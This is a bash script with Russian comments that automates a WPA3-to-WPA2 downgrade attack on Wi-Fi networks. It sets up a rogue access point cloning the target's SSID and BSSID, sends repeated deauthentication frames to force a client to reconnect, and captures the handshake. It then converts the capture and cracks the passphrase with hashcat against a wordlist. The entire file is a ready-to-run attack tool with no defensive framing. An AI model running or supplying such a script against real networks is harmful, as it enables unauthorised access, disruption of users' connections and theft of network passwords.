#!/bin/bash

# Input: dragon.json (parsed for BSSID, ESSID, Channel, Client MAC)
# Results saved in: wifi_data/dragonshift/

set -euo pipefail

# Функция для очистки: останавливает контейнеры и фоновые процессы
cleanup() {
    echo "Stopping attack components..." >&2
    # Убиваем контейнеры, если они запущены
    docker kill "hostapd-mana-${TIMESTAMP:-0}" 2>/dev/null || true
    docker kill "airodump-${TIMESTAMP:-0}" 2>/dev/null || true
    if [ -n "${AIREPLAY_BG_PID:-}" ]; then
        kill $AIREPLAY_BG_PID 2>/dev/null || true
        wait $AIREPLAY_BG_PID 2>/dev/null || true
    fi
    # Удаляем временный файл
    rm -f "$HOSTAPD_CONF" 2>/dev/null || true
    exit 1
}

# Ловим сигналы SIGINT и SIGTERM
trap cleanup SIGINT SIGTERM

if [ $# -lt 5 ]; then
    SCRIPT_NAME="$(basename "$0")"
    cat >&2 << EOF
Usage: $SCRIPT_NAME <json_config> --iface-ap <ap_interface> --iface-mon <mon_interface> <timeout_seconds>

EOF
    exit 1
fi

JSON_FILE="$1"
shift

AP_IFACE=""
MON_IFACE=""
TIMEOUT=""

# Парсинг аргументов с проверкой
while [[ $# -gt 0 ]]; do
    case $1 in
        --iface-ap)
            if [ -n "${2:-}" ] && [[ ! "$2" =~ ^-- ]]; then
                AP_IFACE="$2"
                shift 2
            else
                echo "ERROR: --iface-ap requires an interface name" >&2
                exit 1
            fi
            ;;
        --iface-mon)
            if [ -n "${2:-}" ] && [[ ! "$2" =~ ^-- ]]; then
                MON_IFACE="$2"
                shift 2
            else
                echo "ERROR: --iface-mon requires an interface name" >&2
                exit 1
            fi
            ;;
        -*)
            echo "ERROR: Unknown option: $1" >&2
            exit 1
            ;;
        *)
            if [ -z "$TIMEOUT" ]; then
                TIMEOUT="$1"
            else
                echo "ERROR: Unexpected argument: $1" >&2
                exit 1
            fi
            shift
            ;;
    esac
done

if [ -z "$AP_IFACE" ] || [ -z "$MON_IFACE" ] || [ -z "$TIMEOUT" ]; then
    SCRIPT_NAME="$(basename "$0")"
    cat >&2 << EOF
Usage: $SCRIPT_NAME <json_config> --iface-ap <ap_interface> --iface-mon <mon_interface> <timeout_seconds>

EOF
    exit 1
fi

# Валидация параметров
if ! [[ "$TIMEOUT" =~ ^[0-9]+$ ]]; then
    echo "ERROR: Timeout must be integer" >&2
    exit 1
fi

if [[ ! "$AP_IFACE" =~ ^[a-zA-Z0-9]+([a-zA-Z0-9._-]*[a-zA-Z0-9])?$ ]]; then
    echo "ERROR: AP interface name contains invalid characters" >&2
    exit 1
fi

if [[ ! "$MON_IFACE" =~ ^[a-zA-Z0-9]+([a-zA-Z0-9._-]*[a-zA-Z0-9])?$ ]]; then
    echo "ERROR: Monitor interface name contains invalid characters" >&2
    exit 1
fi

if [ ! -f "$JSON_FILE" ]; then
    echo "ERROR: JSON file not found: $JSON_FILE" >&2
    exit 1
fi

WORDLIST="./wordlists/wordlist.txt"
if [ ! -f "$WORDLIST" ]; then
    echo "ERROR: Wordlist not found: $WORDLIST" >&2
    exit 1
fi

# Парсинг JSON с валидацией
BSSID=$(jq -r '.bssid' "$JSON_FILE" 2>/dev/null || echo "null")
ESSID=$(jq -r '.essid' "$JSON_FILE" 2>/dev/null || echo "null")
CHANNEL=$(jq -r '.channel' "$JSON_FILE" 2>/dev/null || echo "null")
CLIENT_MAC=$(jq -r '.clients[0].mac' "$JSON_FILE" 2>/dev/null || echo "null")

if [ "$BSSID" = "null" ] || [ "$ESSID" = "null" ] || [ "$CHANNEL" = "null" ] || [ "$CLIENT_MAC" = "null" ]; then
    echo "ERROR: Missing required fields in JSON" >&2
    exit 1
fi

# Валидация MAC, BSSID, канала
if ! [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo "ERROR: Invalid BSSID format: $BSSID" >&2
    exit 1
fi

if ! [[ "$CLIENT_MAC" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo "ERROR: Invalid CLIENT MAC format: $CLIENT_MAC" >&2
    exit 1
fi

if ! [[ "$CHANNEL" =~ ^[0-9]+$ ]]; then
    echo "ERROR: Channel must be a number: $CHANNEL" >&2
    exit 1
fi

# Определение hw_mode по каналу
if [ "$CHANNEL" -ge 1 ] && [ "$CHANNEL" -le 11 ]; then
    HW_MODE="g"
elif [ "$CHANNEL" -ge 36 ] && [ "$CHANNEL" -le 165 ]; then
    HW_MODE="a"
else
    echo "ERROR: Channel $CHANNEL is not supported (must be 1-11 or 36-165)" >&2
    exit 1
fi

# Пути
DOCKER_IMAGE="wifi:latest"
DATA_DIR="wifi_data"
DRAGONSHIFT_DIR="$DATA_DIR/dragonshift"
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
PCAP_FILE="$DRAGONSHIFT_DIR/${TIMESTAMP}_dragonshift.cap"
FILTERED_PCAP_FILE="$DRAGONSHIFT_DIR/${TIMESTAMP}_dragonshift_filtered.pcapng"
HC22000_FILE="$DRAGONSHIFT_DIR/${TIMESTAMP}_dragonshift.hc22000"
CRACKED_FILE="$DRAGONSHIFT_DIR/${TIMESTAMP}_dragonshift_cracked.txt"

mkdir -p "$DRAGONSHIFT_DIR"

# Проверка интерфейсов
check_interface_exists() {
    docker run --rm --net=host --cap-drop=ALL --cap-add=NET_ADMIN --cap-add=NET_RAW \
        "$DOCKER_IMAGE" ip link show "$1" >/dev/null 2>&1
    return $?
}

if ! check_interface_exists "$AP_IFACE" || ! check_interface_exists "$MON_IFACE"; then
    echo "ERROR: Interface not found" >&2
    exit 1
fi

# Конфиг hostapd-mana (экранирован для безопасности)
HOSTAPD_CONF="/tmp/hostapd-mana-${TIMESTAMP}.conf"
cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
driver=nl80211
hw_mode=$HW_MODE
channel=$CHANNEL
ssid=$ESSID
bssid=$BSSID
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=12345678
EOF

echo "Starting WPA3 Downgrade Attack" >&2
echo "Target: $ESSID ($BSSID) channel $CHANNEL (hw_mode=$HW_MODE)" >&2
echo "AP iface: $AP_IFACE" >&2
echo "Mon iface: $MON_IFACE" >&2
echo "Timeout: $TIMEOUT s" >&2
echo "Results directory: $DRAGONSHIFT_DIR" >&2

# Вывод конфига Rogue AP
echo "Rogue AP Config:" >&2
echo "  interface=$AP_IFACE" >&2
echo "  driver=nl80211" >&2
echo "  hw_mode=$HW_MODE" >&2
echo "  channel=$CHANNEL" >&2
echo "  ssid=$ESSID" >&2
echo "  bssid=$BSSID" >&2
echo "  wpa=2" >&2
echo "  wpa_key_mgmt=WPA-PSK" >&2
echo "  wpa_pairwise=CCMP" >&2
echo "  rsn_pairwise=CCMP" >&2
echo "  wpa_passphrase=12345678" >&2

# 1. Rogue AP (hostapd-mana) — запуск в фоне
echo "Starting Rogue AP..." >&2
docker run --rm -d \
    --name "hostapd-mana-${TIMESTAMP}" \
    --net=host \
    --cap-add=NET_ADMIN --cap-add=NET_RAW --cap-add=SYS_MODULE \
    --cpus="0.5" --memory="512m" \
    -v "$HOSTAPD_CONF:/etc/hostapd-mana.conf:ro" \
    "$DOCKER_IMAGE" \
    hostapd-mana /etc/hostapd-mana.conf

# 2. Capture traffic with airodump-ng — запуск в фоне
echo "Starting traffic capture..." >&2
docker run --rm -d \
    --name "airodump-${TIMESTAMP}" \
    --net=host \
    --cap-add=NET_ADMIN --cap-add=NET_RAW --cap-add=SYS_MODULE \
    --cpus="0.5" --memory="512m" \
    -v "$(pwd)/$DRAGONSHIFT_DIR:/capture" \
    "$DOCKER_IMAGE" \
    timeout --signal=INT ${TIMEOUT}s \
    airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w /capture/capture --output-format cap "$MON_IFACE"

# 3. Periodic deauthentication (aireplay-ng) — фоновый процесс
echo "Starting periodic deauthentication (5 packets every 20 seconds)..." >&2
(
    START_TIME=$(date +%s)
    while [ $(( $(date +%s) - START_TIME )) -lt "$TIMEOUT" ]; do
        docker run --rm \
            --net=host \
            --cap-add=NET_ADMIN --cap-add=NET_RAW --cap-add=SYS_MODULE \
            "$DOCKER_IMAGE" \
            aireplay-ng -0 5 -a "$BSSID" -c "$CLIENT_MAC" "$MON_IFACE" >/dev/null 2>&1 || true
        
        sleep 20
    done
) &
AIREPLAY_BG_PID=$!

# Ждём завершения
echo "Attack running for $TIMEOUT seconds..." >&2
sleep $TIMEOUT

# Остановка компонентов
echo "Stopping attack components..." >&2
docker kill "hostapd-mana-${TIMESTAMP}" "airodump-${TIMESTAMP}" 2>/dev/null || true
kill $AIREPLAY_BG_PID 2>/dev/null || true
wait $AIREPLAY_BG_PID 2>/dev/null || true

# Обработка захваченного трафика
CAP_CAPTURED=$(ls "$DRAGONSHIFT_DIR"/capture*.cap 2>/dev/null | head -1)
if [ -n "$CAP_CAPTURED" ]; then
    mv "$CAP_CAPTURED" "$PCAP_FILE"
    echo "Captured traffic saved: $PCAP_FILE" >&2
    SIZE=$(du -h "$PCAP_FILE" | cut -f1)
    echo "Capture size: $SIZE" >&2
else
    echo "WARNING: No capture file created" >&2
    rm -f "$HOSTAPD_CONF"
    exit 0
fi

rm -f "$HOSTAPD_CONF"

# Фильтрация .cap с помощью tshark
if [ -s "$PCAP_FILE" ]; then
    echo "Filtering capture with tshark for relevant frames and BSSID: $BSSID..." >&2
    BSSID_LOWER=$(echo "$BSSID" | tr '[:upper:]' '[:lower:]')

    # Фильтр: management фреймы + EAPOL, где BSSID встречается в любом адресном поле
    TSHARK_FILTER="(wlan.fc.type_subtype == 0x00 || wlan.fc.type_subtype == 0x02 || wlan.fc.type_subtype == 0x04 || wlan.fc.type_subtype == 0x05 || wlan.fc.type_subtype == 0x08 || eapol) && wlan.addr == $BSSID_LOWER"

    # Монтируем DRAGONSHIFT_DIR как /dragonshift, чтобы пути совпадали
    docker run --rm \
        -v "$(pwd)/$DRAGONSHIFT_DIR:/dragonshift" \
        "$DOCKER_IMAGE" \
        tshark -Qq -r "/dragonshift/$(basename "$PCAP_FILE")" -Y "$TSHARK_FILTER" -w "/dragonshift/$(basename "$FILTERED_PCAP_FILE")" -F pcapng

    if [ -f "$FILTERED_PCAP_FILE" ] && [ -s "$FILTERED_PCAP_FILE" ]; then
        FILTERED_SIZE=$(du -h "$FILTERED_PCAP_FILE" | cut -f1)
        echo "Filtered capture saved: $FILTERED_PCAP_FILE (size: $FILTERED_SIZE)" >&2
    else
        echo "WARNING: No packets matched the filter. Using original capture for hash conversion." >&2
        FILTERED_PCAP_FILE="$PCAP_FILE"
    fi
else
    echo "WARNING: Original capture file is empty" >&2
    exit 0
fi

# Конвертация .pcapng в .hc22000
if [ -s "$FILTERED_PCAP_FILE" ]; then
    echo "Converting .pcapng to .hc22000 with hcxpcapngtool..." >&2
    docker run --rm \
        -v "$(pwd)/$DRAGONSHIFT_DIR:/dragonshift" \
        "$DOCKER_IMAGE" \
        hcxpcapngtool -o "/dragonshift/${TIMESTAMP}_dragonshift.hc22000" "/dragonshift/$(basename "$FILTERED_PCAP_FILE")" 2>&1 | grep -v -E "summary|file name|version|timestamp|duration|used|link|endianness|packets|ESSID|BEACON|ACTION|PROBERESPONSE|DEAUTHENTICATION|AUTHENTICATION|ASSOCIATIONREQUEST|REASSOCIATIONREQUEST|WPA|EAPOL|EAPOLTIME|EAPOL ANONCE|EAPOL M1|EAPOL M2|EAPOL M3|EAPOL M4|EAPOL pairs|session summary|processed|Information:|Warning:|https:"

    if [ -f "$HC22000_FILE" ] && [ -s "$HC22000_FILE" ]; then
        echo "Valid hash(es) extracted! Starting hashcat -m 22000..." >&2
        docker run --rm \
            -v "$(pwd)/$DRAGONSHIFT_DIR:/dragonshift" \
            -v "$(pwd)/wordlists:/wordlists:ro" \
            "$DOCKER_IMAGE" \
            hashcat -m 22000 "/dragonshift/${TIMESTAMP}_dragonshift.hc22000" /wordlists/wordlist.txt -o "/dragonshift/${TIMESTAMP}_dragonshift_cracked.txt" --force

        chmod -R 644 "$DRAGONSHIFT_DIR"/* 2>/dev/null || true

        if [ -f "$CRACKED_FILE" ] && [ -s "$CRACKED_FILE" ]; then
            echo "PASSWORD FOUND!" >&2
            echo "Saved to: $CRACKED_FILE" >&2
        else
            echo "No password found in wordlist" >&2
        fi
    else
        echo "No valid hashes extracted from capture" >&2
    fi
else
    echo "WARNING: Filtered capture file is empty" >&2
fi

echo "Downgrade attack finished." >&2